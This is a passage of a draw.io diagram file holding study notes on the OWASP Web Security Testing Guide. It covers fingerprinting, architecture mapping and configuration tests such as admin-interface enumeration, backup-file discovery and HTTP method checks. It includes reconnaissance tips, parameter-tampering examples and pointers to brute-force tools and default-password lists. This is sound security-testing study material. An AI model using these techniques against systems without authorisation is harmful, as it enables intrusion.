200);&quot;&gt;X-Generator&lt;/i&gt;).&lt;/p&gt;&lt;p&gt;&lt;b&gt;Cookies&lt;/b&gt;: look for common cookie names in Cookies section (&lt;i style=&quot;background-color: rgb(200, 200, 200);&quot;&gt;CAKEPHP&lt;/i&gt;).&lt;/p&gt;&lt;p&gt;&lt;b&gt;HTML source code&lt;/b&gt;:&amp;nbsp;find certain patterns in the HTML page source code (HTML comments, certain framework-specific paths, specific script variables, &lt;i style=&quot;background-color: rgb(200, 200, 200);&quot;&gt;&amp;lt;head&amp;gt;&lt;/i&gt; section of HTTP responses, &lt;i style=&quot;background-color: rgb(200, 200, 200);&quot;&gt;&amp;lt;meta&amp;gt;&lt;/i&gt; tags, end of page).&lt;/p&gt;&lt;p&gt;&lt;b&gt;Specific files and folders&lt;/b&gt;:&amp;nbsp;dirbusting (brute forcing a target with known folder and filenames and monitoring HTTP-responses to enumerate server content),&amp;nbsp;check the &lt;i style=&quot;background-color: rgb(200, 200, 200);&quot;&gt;robots.txt&lt;/i&gt;, use vocabularies (&lt;a href=&quot;https://github.com/fuzzdb-project/fuzzdb&quot;&gt;FuzzDB&lt;/a&gt;).&lt;/p&gt;&lt;p&gt;&lt;b&gt;File extensions&lt;/b&gt;: check&amp;nbsp;file extensions in&amp;nbsp;URLs (&quot;&lt;i style=&quot;background-color: rgb(200, 200, 200);&quot;&gt;.php&lt;/i&gt;&quot;, &quot;&lt;i style=&quot;background-color: rgb(200, 200, 200);&quot;&gt;.aspx&lt;/i&gt;&quot;, &quot;&lt;span style=&quot;background-color: rgb(200, 200, 200);&quot;&gt;&lt;i&gt;.jsp&lt;/i&gt;&lt;/span&gt;&quot;).&lt;/p&gt;&lt;p&gt;&lt;b&gt;Error messages&lt;/b&gt;: check the system path points and other leaks.&lt;/p&gt;&lt;p&gt;Modifying/hiding such a parameters is a&amp;nbsp;“security through obscurity”.&lt;/p&gt;&lt;p&gt;Tools:&amp;nbsp;&lt;a href=&quot;https://github.com/urbanadventurer/WhatWeb&quot;&gt;WhatWeb&lt;/a&gt;,&amp;nbsp;&lt;a href=&quot;https://www.wappalyzer.com/&quot;&gt;Wappalyzer&lt;/a&gt;.&lt;/p&gt;" vertex="1">
          <mxGeometry height="520" width="400" x="40" y="5300" as="geometry" />
        </mxCell>
        <mxCell id="BLCWNIVHLjBfTySb7dGb-1" parent="1" style="text;html=1;overflow=visible;rounded=0;strokeColor=default;whiteSpace=wrap;fontFamily=Times New Roman;" value="&lt;h1 style=&quot;margin-top: 0px;&quot;&gt;WSTG-INFO-09&lt;/h1&gt;&lt;h1 style=&quot;margin-top: 0px;&quot;&gt;Fingerprint Web Application&lt;/h1&gt;&lt;p&gt;Merged into &lt;b&gt;WSTG-INFO-08&lt;/b&gt;.&lt;/p&gt;" vertex="1">
          <mxGeometry height="120" width="400" x="40" y="5820" as="geometry" />
        </mxCell>
        <mxCell id="BLCWNIVHLjBfTySb7dGb-2" parent="1" style="text;html=1;overflow=visible;rounded=0;strokeColor=default;whiteSpace=wrap;fontFamily=Times New Roman;" value="&lt;h1 style=&quot;margin-top: 0px;&quot;&gt;WSTG-INFO-10&lt;/h1&gt;&lt;h1 style=&quot;margin-top: 0px;&quot;&gt;Map Application Architecture&lt;/h1&gt;&lt;p&gt;&lt;span style=&quot;background-color: transparent;&quot;&gt;Before performing an in-depth review it is necessary to map the network and application architecture. The different elements that make up the infrastructure need to be determined to understand how they interact with a web application and how they affect security.&lt;/span&gt;&lt;/p&gt;&lt;hr id=&quot;null&quot;&gt;&lt;p&gt;Generate a map of the application at hand based on the research conducted.&lt;/p&gt;&lt;hr id=&quot;null&quot;&gt;&lt;p&gt;Go from simple to complex structure.&lt;/p&gt;&lt;p&gt;Combine with other &lt;b&gt;WSTG-INFO-**&lt;/b&gt; instructions.&lt;/p&gt;&lt;p&gt;Find servers, proxies, load-balancers, proxy-caches, backend-servers, authentication servers, databases.&lt;/p&gt;" vertex="1">
          <mxGeometry height="320" width="400" x="40" y="5940" as="geometry" />
        </mxCell>
        <mxCell id="Xtgh9ku97yeF3pHVwmKX-1" parent="1" style="text;html=1;overflow=visible;rounded=0;strokeColor=default;whiteSpace=wrap;fontFamily=Times New Roman;" value="&lt;h1 style=&quot;margin-top: 0px;&quot;&gt;01. Information Gathering&lt;/h1&gt;" vertex="1">
          <mxGeometry height="40" width="400" x="40" y="40" as="geometry" />
        </mxCell>
        <mxCell id="vnCINJZAg8eJKPkLlaBq-1" parent="1" style="text;html=1;overflow=visible;rounded=0;strokeColor=default;whiteSpace=wrap;fontFamily=Times New Roman;fontSize=12;" value="&lt;h1 style=&quot;margin-top: 0px;&quot;&gt;02. CFG &amp;amp; Deploy MGMT Testing&lt;/h1&gt;" vertex="1">
          <mxGeometry height="40" width="400" x="440" y="40" as="geometry" />
        </mxCell>
        <mxCell id="vnCINJZAg8eJKPkLlaBq-2" parent="1" style="text;html=1;overflow=visible;rounded=0;strokeColor=default;whiteSpace=wrap;fontFamily=Times New Roman;" value="&lt;h1 style=&quot;margin-top: 0px;&quot;&gt;03. Identity Management Testing&lt;/h1&gt;" vertex="1">
          <mxGeometry height="40" width="400" x="840" y="40" as="geometry" />
        </mxCell>
        <mxCell id="vnCINJZAg8eJKPkLlaBq-3" parent="1" style="text;html=1;overflow=visible;rounded=0;strokeColor=default;whiteSpace=wrap;fontFamily=Times New Roman;" value="&lt;h1 style=&quot;margin-top: 0px;&quot;&gt;04. Authentication Testing&lt;/h1&gt;" vertex="1">
          <mxGeometry height="40" width="400" x="1240" y="40" as="geometry" />
        </mxCell>
        <mxCell id="vnCINJZAg8eJKPkLlaBq-4" parent="1" style="text;html=1;overflow=visible;rounded=0;strokeColor=default;whiteSpace=wrap;fontFamily=Times New Roman;" value="&lt;h1 style=&quot;margin-top: 0px;&quot;&gt;05. Authorization Testing&lt;/h1&gt;" vertex="1">
          <mxGeometry height="40" width="400" x="1640" y="40" as="geometry" />
        </mxCell>
        <mxCell id="e2LGitZVtsBYH8VqKQJQ-1" parent="1" style="text;html=1;overflow=visible;rounded=0;strokeColor=default;whiteSpace=wrap;fontFamily=Times New Roman;" value="&lt;h1 style=&quot;margin-top: 0px;&quot;&gt;06. Session Management Testing&lt;/h1&gt;" vertex="1">
          <mxGeometry height="40" width="400" x="2040" y="40" as="geometry" />
        </mxCell>
        <mxCell id="e2LGitZVtsBYH8VqKQJQ-2" parent="1" style="text;html=1;overflow=visible;rounded=0;strokeColor=default;whiteSpace=wrap;fontFamily=Times New Roman;" value="&lt;h1 style=&quot;margin-top: 0px;&quot;&gt;07. Input Validation Testing&lt;/h1&gt;" vertex="1">
          <mxGeometry height="40" width="400" x="2440" y="40" as="geometry" />
        </mxCell>
        <mxCell id="5YzgcKyQua0hDtOVWHvY-1" parent="1" style="text;html=1;overflow=visible;rounded=0;strokeColor=default;whiteSpace=wrap;fontFamily=Times New Roman;" value="&lt;h1 style=&quot;margin-top: 0px;&quot;&gt;08. Error Handling&lt;/h1&gt;" vertex="1">
          <mxGeometry height="40" width="400" x="2840" y="40" as="geometry" />
        </mxCell>
        <mxCell id="5YzgcKyQua0hDtOVWHvY-2" parent="1" style="text;html=1;overflow=visible;rounded=0;strokeColor=default;whiteSpace=wrap;fontFamily=Times New Roman;" value="&lt;h1 style=&quot;margin-top: 0px;&quot;&gt;09. Cryptography&lt;/h1&gt;" vertex="1">
          <mxGeometry height="40" width="400" x="3240" y="40" as="geometry" />
        </mxCell>
        <mxCell id="5YzgcKyQua0hDtOVWHvY-3" parent="1" style="text;html=1;overflow=visible;rounded=0;strokeColor=default;whiteSpace=wrap;fontFamily=Times New Roman;" value="&lt;h1 style=&quot;margin-top: 0px;&quot;&gt;10. Business Logic Testing&lt;/h1&gt;" vertex="1">
          <mxGeometry height="40" width="400" x="3640" y="40" as="geometry" />
        </mxCell>
        <mxCell id="5YzgcKyQua0hDtOVWHvY-4" parent="1" style="text;html=1;overflow=visible;rounded=0;strokeColor=default;whiteSpace=wrap;fontFamily=Times New Roman;" value="&lt;h1 style=&quot;margin-top: 0px;&quot;&gt;11. Client-side Testing&lt;/h1&gt;" vertex="1">
          <mxGeometry height="40" width="400" x="4040" y="40" as="geometry" />
        </mxCell>
        <mxCell id="5YzgcKyQua0hDtOVWHvY-5" parent="1" style="text;html=1;overflow=visible;rounded=0;strokeColor=default;whiteSpace=wrap;fontFamily=Times New Roman;" value="&lt;h1 style=&quot;margin-top: 0px;&quot;&gt;12. API Testing&lt;/h1&gt;" vertex="1">
          <mxGeometry height="40" width="400" x="4440" y="40" as="geometry" />
        </mxCell>
        <mxCell id="Ji4hziP3PQ5C6nk72wQw-1" parent="1" style="text;html=1;overflow=visible;rounded=0;strokeColor=default;whiteSpace=wrap;fontFamily=Times New Roman;" value="&lt;h1 style=&quot;margin-top: 0px;&quot;&gt;WSTG-CONF-01&lt;/h1&gt;&lt;h1 style=&quot;margin-top: 0px;&quot;&gt;Test Network Infrastructure Configuration&lt;/h1&gt;&lt;p&gt;After having mapped the different infrastructure elements (&lt;b&gt;WSTG-INFO-10&lt;/b&gt;) review the configuration of each element founded and test for any known vulnerabilities.&lt;/p&gt;&lt;hr id=&quot;null&quot;&gt;&lt;p&gt;&lt;/p&gt;&lt;ul&gt;&lt;li&gt;Review the applications’ configurations set across the network and validate that they are not vulnerable.&lt;/li&gt;&lt;li&gt;Validate that used frameworks and systems are secure and not susceptible to known vulnerabilities due to unmaintained software or default settings and credentials.&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;&lt;/p&gt;&lt;hr id=&quot;null&quot;&gt;&lt;p&gt;Use an automated tools for&amp;nbsp;blind penetration test and known vulnerabilities searching.&lt;/p&gt;&lt;p&gt;Check and test defaults (logins, passwords, tokens, etc).&lt;/p&gt;&lt;p&gt;Map administrative tools interfaces with&amp;nbsp;infrastructure elements.&lt;/p&gt;&lt;p&gt;Determine the mechanisms that control access to these interfaces and their associated susceptibilities.&lt;/p&gt;" vertex="1">
          <mxGeometry height="420" width="400" x="440" y="80" as="geometry" />
        </mxCell>
        <mxCell id="7fymIb3-kL573B4DB6dZ-1" parent="1" style="text;html=1;overflow=visible;rounded=0;strokeColor=default;whiteSpace=wrap;fontFamily=Times New Roman;" value="&lt;h1 style=&quot;margin-top: 0px;&quot;&gt;WSTG-CONF-02&lt;/h1&gt;&lt;h1 style=&quot;margin-top: 0px;&quot;&gt;Test Application Platform Configuration&lt;/h1&gt;&lt;p&gt;Configuration review and testing is a critical task in creating and maintaining an architecture.&lt;br&gt;&lt;/p&gt;&lt;hr id=&quot;null&quot;&gt;&lt;p&gt;&lt;/p&gt;&lt;ul&gt;&lt;li&gt;Ensure that defaults and known files have been removed.&lt;/li&gt;&lt;li&gt;Validate that no debugging code or extensions are left in the production environments.&lt;/li&gt;&lt;li&gt;Review the logging mechanisms set in place for the application.&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;&lt;/p&gt;&lt;hr id=&quot;null&quot;&gt;&lt;p&gt;Do a full review of the contents of the web or application server and determine of whether they are related to the application itself or not.&lt;br&gt;&lt;/p&gt;&lt;p&gt;Do a comment reiew to prevent sensitive information leaks.&lt;/p&gt;&lt;p&gt;Various tools (&lt;a href=&quot;https://www.cisecurity.org/blog/introducing-cis-cat-lite/&quot;&gt;CIS-CAT Lite&lt;/a&gt;, &lt;a href=&quot;https://github.com/microsoft/AttackSurfaceAnalyzer&quot;&gt;Microsoft’s Attack Surface Analyzer&lt;/a&gt;), documents (&lt;a href=&quot;https://www.pcisecuritystandards.org/document_library&quot;&gt;PCI DSS&lt;/a&gt;), or checklists (&lt;a href=&quot;https://nvd.nist.gov/ncp/repository&quot;&gt;NIST’s National Checklist Program&lt;/a&gt;, &lt;a href=&quot;https://cheatsheetseries.owasp.org/index.html&quot;&gt;OWASP Cheat Sheet Series&lt;/a&gt;) can help to assess&amp;nbsp;target systems’ conformance to various configuration baselines or benchmarks.&lt;br&gt;&lt;/p&gt;&lt;p&gt;Check the server errors (40x or 50x) for sensitive information leaks (it should be&amp;nbsp; handled with custom-made pages).&lt;br&gt;&lt;/p&gt;&lt;p&gt;Check account privileges set (Run servers&amp;nbsp;with minimized privileges in the operating system).&lt;/p&gt;&lt;p&gt;Check security events for both success and fail operations.&lt;/p&gt;&lt;p&gt;Check dedicated storage for security events.&lt;/p&gt;&lt;p&gt;Check role model in case of access to security events storage.&lt;/p&gt;&lt;p&gt;Check events backup and rotation rules, retention period.&amp;nbsp;&lt;/p&gt;" vertex="1">
          <mxGeometry height="580" width="400" x="440" y="500" as="geometry" />
        </mxCell>
        <mxCell id="u0_Dg34OVsO6wt9TMe---1" parent="1" style="text;html=1;overflow=visible;rounded=0;strokeColor=default;whiteSpace=wrap;fontFamily=Times New Roman;" value="&lt;h1 style=&quot;margin-top: 0px;&quot;&gt;WSTG-CONF-03&lt;/h1&gt;&lt;h1 style=&quot;margin-top: 0px;&quot;&gt;Test File Extensions Handling for Sensitive Information&lt;/h1&gt;&lt;p&gt;Extension checking is often used to validate files to be uploaded, which can lead to unexpected results because the content is not what is expected, or because of unexpected OS filename handling.&lt;/p&gt;&lt;hr id=&quot;null&quot;&gt;&lt;p&gt;&lt;/p&gt;&lt;ul&gt;&lt;li&gt;Dirbust sensitive file extensions, or extensions that might contain raw data (e.g. scripts, raw data, credentials, etc.).&lt;/li&gt;&lt;li&gt;Validate that no system framework bypasses exist on the rules set.&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;&lt;/p&gt;&lt;hr id=&quot;null&quot;&gt;&lt;p&gt;Submit requests with different file extensions and verify how they are handled.&lt;br&gt;&lt;/p&gt;&lt;p&gt;Check&amp;nbsp;file extensions never being returned by a web server (&quot;&lt;i style=&quot;background-color: rgb(200, 200, 200);&quot;&gt;*.inc&lt;/i&gt;&quot;, &quot;&lt;i style=&quot;background-color: rgb(200, 200, 200);&quot;&gt;*.config&lt;/i&gt;&quot;).&lt;/p&gt;&lt;p&gt;Check file extensions to verify that they&amp;nbsp;are indeed supposed to be served (archives, sources, text and other office docs, backups, etc).&lt;/p&gt;&lt;p&gt;Use &lt;a href=&quot;https://filext.com/&quot;&gt;FILExt&lt;/a&gt; to create whitelist of served extensions.&lt;/p&gt;" vertex="1">
          <mxGeometry height="420" width="400" x="440" y="1080" as="geometry" />
        </mxCell>
        <mxCell id="1LXz438L5iuRgMA5hW5X-1" parent="1" style="text;html=1;overflow=visible;rounded=0;strokeColor=default;whiteSpace=wrap;fontFamily=Times New Roman;" value="&lt;h1 style=&quot;margin-top: 0px;&quot;&gt;WSTG-CONF-04&lt;/h1&gt;&lt;h1 style=&quot;margin-top: 0px;&quot;&gt;Review Old Backup and Unreferenced Files for Sensitive Information&lt;/h1&gt;&lt;p&gt;Old, backup and unreferenced files present various threats to the security of a web application.&lt;br&gt;&lt;/p&gt;&lt;hr id=&quot;null&quot;&gt;&lt;p&gt;Inference from the Naming Scheme Used for Published Content (&quot;&lt;i&gt;&lt;span style=&quot;background-color: rgb(200, 200, 200);&quot;&gt;&lt;b style=&quot;&quot;&gt;view&lt;/b&gt;user.asp&lt;/span&gt;&quot;&lt;/i&gt; -&amp;gt; &quot;&lt;i&gt;&lt;span style=&quot;background-color: rgb(200, 200, 200);&quot;&gt;&lt;b style=&quot;&quot;&gt;edit&lt;/b&gt;user.asp&lt;/span&gt;&quot;&lt;/i&gt;/&quot;&lt;i&gt;&lt;span style=&quot;background-color: rgb(200, 200, 200);&quot;&gt;&lt;b style=&quot;&quot;&gt;add&lt;/b&gt;user.asp&lt;/span&gt;&quot;&lt;/i&gt;/&lt;span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;b style=&quot;font-style: italic;&quot;&gt;delete&lt;/b&gt;&lt;i style=&quot;&quot;&gt;&lt;span&gt;user.asp&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;/i&gt;&lt;/span&gt;, &quot;&lt;i style=&quot;&quot;&gt;&lt;span style=&quot;background-color: rgb(200, 200, 200);&quot;&gt;/app/&lt;b style=&quot;&quot;&gt;user&lt;/b&gt;&lt;/span&gt;&quot; -&amp;gt; &quot;&lt;/i&gt;&lt;i style=&quot;&quot;&gt;&lt;span style=&quot;background-color: rgb(200, 200, 200);&quot;&gt;/app/&lt;b style=&quot;&quot;&gt;admin&lt;/b&gt;&lt;/span&gt;&quot;/&quot;&lt;/i&gt;&lt;i style=&quot;&quot;&gt;&lt;span style=&quot;background-color: rgb(200, 200, 200);&quot;&gt;/app/&lt;b style=&quot;&quot;&gt;manager&lt;/b&gt;&lt;/span&gt;&quot;&lt;/i&gt;&lt;span style=&quot;background-color: transparent;&quot;&gt;).&lt;/span&gt;&lt;/p&gt;&lt;p&gt;&lt;span style=&quot;background-color: transparent;&quot;&gt;Clues in Published Content (hidden pages in comments,&amp;nbsp;&lt;/span&gt;&lt;span style=&quot;background-color: transparent;&quot;&gt;circumstances,&amp;nbsp;&lt;/span&gt;&lt;span style=&quot;background-color: transparent;&quot;&gt;robots.txt&lt;/span&gt;&lt;span style=&quot;background-color: transparent;&quot;&gt;).&lt;/span&gt;&lt;/p&gt;&lt;p&gt;&lt;span style=&quot;background-color: transparent;&quot;&gt;Blind Guessing (dirbust URL parameters and check HTTP response codes (200, 301, 302, 401, 403, 500), prepare custom wordlist derived from other techniques findings).&lt;br&gt;&lt;/span&gt;&lt;/p&gt;&lt;p&gt;&lt;span style=&quot;background-color: transparent;&quot;&gt;Information Obtained Through Server Vulnerabilities and Misconfiguration (try to use known server vulnerabilities and PoCs).&lt;br&gt;&lt;/span&gt;&lt;/p&gt;&lt;p&gt;&lt;span style=&quot;background-color: transparent;&quot;&gt;Publicly Available Information (web&amp;nbsp;&lt;/span&gt;&lt;span style=&quot;background-color: transparent;&quot;&gt;archives, search operators,&amp;nbsp;&lt;/span&gt;&lt;span style=&quot;background-color: transparent;&quot;&gt;cached versions of pages&lt;/span&gt;&lt;span style=&quot;background-color: transparent;&quot;&gt;).&lt;/span&gt;&lt;/p&gt;&lt;p&gt;&lt;span style=&quot;background-color: transparent;&quot;&gt;Exploit differences in ways that filenames are parsed by the application, web server, and underlying OS and it’s filename conventions (&quot;&lt;/span&gt;&lt;i style=&quot;background-color: rgb(200, 200, 200);&quot;&gt;&lt;b style=&quot;&quot;&gt;c:\\progra&lt;/b&gt;m files&lt;/i&gt;&quot; -&amp;gt; &quot;&lt;i style=&quot;background-color: rgb(200, 200, 200);&quot;&gt;&lt;b style=&quot;&quot;&gt;C:\\PROGRA&lt;/b&gt;\~1&lt;/i&gt;&quot;&lt;span style=&quot;background-color: transparent;&quot;&gt;).&lt;/span&gt;&lt;/p&gt;&lt;p&gt;&lt;span style=&quot;background-color: transparent;&quot;&gt;Periodically schedule a background job checking for files with extensions likely to identify them as copy or backup files&amp;nbsp;&lt;/span&gt;&lt;span style=&quot;background-color: transparent;&quot;&gt;in the directories from the set of web directories served by the web server,&lt;/span&gt;&amp;nbsp;performing manual checks on a longer time basis (&quot;&lt;i style=&quot;background-color: rgb(200, 200, 200);&quot;&gt;.old&lt;/i&gt;&quot;, &quot;&lt;i style=&quot;background-color: rgb(200, 200, 200);&quot;&gt;.bak&lt;/i&gt;&quot;, &quot;&lt;i style=&quot;background-color: rgb(200, 200, 200);&quot;&gt;.backup&lt;/i&gt;&quot;).&lt;span style=&quot;background-color: transparent;&quot;&gt;&lt;br&gt;&lt;/span&gt;&lt;/p&gt;&lt;hr id=&quot;null&quot;&gt;&lt;p&gt;Don&#39;t edit files in-place on the web server or application server file systems.&lt;/p&gt;&lt;p&gt;Carefully check any activity performed on file systems exposed by the web server (spot administration activities).&lt;br&gt;&lt;/p&gt;&lt;p&gt;Use appropriate configuration management policies.&lt;br&gt;&lt;/p&gt;&lt;p&gt;Application shouldn&#39;t work with data under the web directory trees served by the web server.&lt;/p&gt;&lt;p&gt;Deny access to folders with filesystem snapshots.&lt;br&gt;&lt;/p&gt;&lt;p&gt;Tools: &lt;a href=&quot;https://www.tenable.com/products/nessus&quot;&gt;Nessus&lt;/a&gt;, &lt;a href=&quot;https://cirt.net/Nikto2&quot;&gt;Nikto2&lt;/a&gt;, &lt;a href=&quot;https://www.gnu.org/software/wget/&quot;&gt;wget&lt;/a&gt;, &lt;a href=&quot;https://curl.haxx.se/&quot;&gt;curl&lt;/a&gt;,&amp;nbsp;&lt;a href=&quot;https://web.archive.org/web/20090926061558/http://preview.samspade.org/ssw/download.html&quot;&gt;Sam Spade&lt;/a&gt;, &lt;a href=&quot;https://www.spikeproxy.com/&quot;&gt;Spike&lt;/a&gt;, &lt;a href=&quot;http://home.snafu.de/tilman/xenulink.html&quot;&gt;Xenu&lt;/a&gt;.&lt;/p&gt;" vertex="1">
          <mxGeometry height="800" width="400" x="440" y="1500" as="geometry" />
        </mxCell>
        <mxCell id="Zty-geitHG_htesr6zDO-1" parent="1" style="text;html=1;overflow=visible;rounded=0;strokeColor=default;whiteSpace=wrap;fontFamily=Times New Roman;" value="&lt;h1 style=&quot;margin-top: 0px;&quot;&gt;WSTG-CONF-05&lt;/h1&gt;&lt;h1 style=&quot;margin-top: 0px;&quot;&gt;Enumerate Infrastructure and Application Admin Interfaces&lt;/h1&gt;&lt;p&gt;An application may require an administrator interface to enable a privileged user to access functionality that may make changes to how the site functions&lt;br&gt;&lt;/p&gt;&lt;hr id=&quot;null&quot;&gt;&lt;p&gt;Identify hidden administrator interfaces and functionality.&lt;br&gt;&lt;/p&gt;&lt;hr id=&quot;null&quot;&gt;&lt;p&gt;Attempt to guess the path of the administrative interface (&quot;&lt;i style=&quot;background-color: rgb(200, 200, 200);&quot;&gt;/admin&lt;/i&gt;&quot;, &quot;&lt;i style=&quot;background-color: rgb(200, 200, 200);&quot;&gt;/administrator&lt;/i&gt;&quot;).&lt;br&gt;&lt;/p&gt;&lt;p&gt;Brute force of server contents via tools.&lt;br&gt;&lt;/p&gt;&lt;p&gt;Review comments and links in source code.&lt;br&gt;&lt;/p&gt;&lt;p&gt;Review server and application documentation or publicly available information (default values).&lt;/p&gt;&lt;p&gt;Check alternative server port (Apache Tomcat’s Administration interface on port 8080).&lt;br&gt;&lt;/p&gt;&lt;p&gt;Parameter tampering of&amp;nbsp;GET or POST request parameter or a cookie variable (&quot;&lt;i style=&quot;background-color: rgb(200, 200, 200);&quot;&gt;&amp;lt;input type=&quot;hidden&quot; name=&quot;admin&quot; value=&quot;no&quot;&amp;gt;&lt;/i&gt;&quot;, &quot;&lt;i style=&quot;background-color: rgb(200, 200, 200);&quot;&gt;Cookie: session_cookie; useradmin=0&lt;/i&gt;&quot;).&lt;/p&gt;&lt;p&gt;Tools: &lt;a href=&quot;https://www.zaproxy.org/docs/desktop/addons/forced-browse/&quot;&gt;OWASP ZAP&lt;/a&gt;, &lt;a href=&quot;https://github.com/vanhauser-thc/thc-hydra&quot;&gt;THC-Hydra&lt;/a&gt;, &lt;a href=&quot;https://github.com/fuzzdb-project/fuzzdb&quot;&gt;FuzzDB&lt;/a&gt;&amp;nbsp;(&lt;a href=&quot;https://github.com/fuzzdb-project/fuzzdb/blob/master/discovery/predictable-filepaths/login-file-locations/Logins.txt&quot;&gt;login pages&lt;/a&gt; and &lt;a href=&quot;https://github.com/fuzzdb-project/fuzzdb/blob/master/attack/business-logic/CommonDebugParamNames.txt&quot;&gt;common debug parameters&lt;/a&gt; dictionaries),&amp;nbsp;&lt;a href=&quot;https://www.netsparker.com/blog/web-security/svn-digger-better-lists-for-forced-browsing/&quot;&gt;Netsparker dictionary&lt;/a&gt;, &lt;a href=&quot;https://cirt.net/passwords&quot;&gt;Cirt: default password list&lt;/a&gt;.&lt;/p&gt;" vertex="1">
          <mxGeometry height="520" width="400" x="440" y="2300" as="geometry" />
        </mxCell>
        <mxCell id="18MrNAwSvhtbDqxyqERw-1" parent="1" style="text;html=1;overflow=visible;rounded=0;strokeColor=default;whiteSpace=wrap;fontFamily=Times New Roman;" value="&lt;h1 style=&quot;margin-top: 0px;&quot;&gt;WSTG-CONF-06&lt;/h1&gt;&lt;h1 style=&quot;margin-top: 0px;&quot;&gt;Test HTTP Methods&lt;/h1&gt;&lt;p&gt;HTTP allows several other (except classic GET and POST) methods, which can be used for nefarious purposes if the web server is misconfigured.&lt;br&gt;&lt;/p&gt;&lt;hr id=&quot;null&quot;&gt;&lt;p&gt;Discover the Supported Methods (&lt;i style=&quot;background-color: rgb(200, 200, 200);&quot;&gt;OPTIONS&lt;/i&gt;&amp;nbsp;HTTP request method or&amp;nbsp;&lt;i&gt;http-methods&lt;/i&gt; Nmap script).&lt;br&gt;&lt;/p&gt;&lt;p&gt;Make sure that all endpoints accept only the methods that they require.&lt;br&gt;&lt;/p&gt;&lt;p&gt;Check pages that&amp;nbsp;responds with a &lt;i style=&quot;background-color: rgb(200, 200, 200);&quot;&gt;HTTP/1.1 200 OK&lt;/i&gt;, when web application&amp;nbsp;has a security constraint, to Access Control Bypass.&lt;/p&gt;&lt;p&gt;Check&amp;nbsp;XST (cross-site tracing) attack vector (&lt;i style=&quot;background-color: rgb(200, 200, 200);&quot;&gt;TRACE&lt;/i&gt; HTTP request method provide the reflection of the received message back to the client ignoring HttpOnly attribute and leaking users&#39; credentials).&lt;/p&gt;&lt;p&gt;Check the HTTP Method Overriding (&lt;i style=&quot;background-color: rgb(200, 200, 200);&quot;&gt;X-HTTP-Method&lt;/i&gt;, &lt;i style=&quot;background-color: rgb(200, 200, 200);&quot;&gt;X-HTTP-Method-Override&lt;/i&gt;, &lt;i style=&quot;background-color: rgb(200, 200, 200);&quot;&gt;X-Method-Override&lt;/i&gt;&amp;nbsp;headers in several frameworks).&lt;/p&gt;&lt;p&gt;Ensure that only the required headers are allowed, and that the allowed headers are properly configured.&lt;/p&gt;&lt;p&gt;Tools: &lt;a href=&quot;https://nmap.org/ncat/&quot;&gt;Ncat&lt;/a&gt;, &lt;a href=&quot;https://curl.haxx.se/&quot;&gt;cURL&lt;/a&gt;, &lt;a href=&quot;https://nmap.org/nsedoc/scripts/http-methods.html&quot;&gt;http-methods Nmap script&lt;/a&gt;, &lt;a href=&quot;https://capec.mitre.org/data/definitions/107.html&quot;&gt;CAPEC: XST&lt;/a&gt;.&lt;/p&gt;" vertex="1">
          <mxGeometry height="440" width="400" x="440" y="2820" as="geometry" />
        </mxCell>
        <mxCell id="RcGdDZ3HlnkjEXBhJJGQ-1" parent="1" style="text;html=1;overflow=visible;rounded=0;strokeColor=default;whiteSpace=wrap;fontFamily=Times New Roman;" value="&lt;h1 style=&quot;margin-top: 0px;&quot;&gt;WSTG-CONF-07&lt;/h1&gt;&lt;h1 style=&quot;margin-top: 0px;&quot;&gt;Test HTTP Strict Transport Security&lt;/h1&gt;&lt;p&gt;The HTTP Strict Transport Security (HSTS) feature lets a web application inform the browser through the use of a special response header that it should never establish a connection to the specified domain servers using un-encrypted HTTP.&lt;/p&gt;&lt;p&gt;Verify that the web site is using this HTTP header in order to ensure that all the data travels encrypted between the web browser and the server.&lt;/p&gt;&lt;hr id=&quot;null&quot;&gt;&lt;p&gt;HSTS directives:&lt;/p&gt;&lt;p&gt;&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;b style=&quot;background-color: rgb(200, 200, 200);&quot;&gt;max-age&lt;/b&gt; (number of seconds that the browser should automatically convert all HTTP requests to HTTPS);&lt;/li&gt;&lt;li&gt;&lt;b style=&quot;background-color: rgb(200, 200, 200);&quot;&gt;includeSubDomains&lt;/b&gt; (indicate that all related sub-domains must use HTTPS);&lt;/li&gt;&lt;li&gt;&lt;b style=&quot;background-color: rgb(200, 200, 200);&quot;&gt;preload&lt;/b&gt; (indicate that the domain(s) are on the preload list(s) and that browsers should never connect without HTTPS) - unofficial (this is supported by all major browsers but is not official part of the &lt;a href=&quot;https://hstspreload.org/&quot;&gt;specification&lt;/a&gt;).&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;&lt;/p&gt;&lt;p&gt;&lt;i style=&quot;background-color: rgb(200, 200, 200);&quot;&gt;Strict-Transport-Security: max-age=31536000; includeSubDomains&lt;/i&gt;&lt;/p&gt;&lt;p&gt;The presence of the HSTS header can be confirmed by examining the server’s response through an intercepting proxy or by using curl:&lt;br&gt;&lt;i style=&quot;background-color: rgb(200, 200, 200);&quot;&gt;curl -s -D- https://owasp.org | grep -i strict&lt;/i&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;Tools: &lt;a href=&quot;https://cheatsheetseries.owasp.org/cheatsheets/HTTP_Strict_Transport_Security_Cheat_Sheet.html&quot;&gt;OWASP HSTS&lt;/a&gt;, &lt;a href=&quot;https://www.youtube.com/watch?v=zEV3HOuM_Vw&quot;&gt;OWASP AppSec Tutorials: HSTS&lt;/a&gt;.&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;" vertex="1">
          <mxGeometry height="520" width="400" x="440" y="3260" as="geometry" />
        </mxCell>
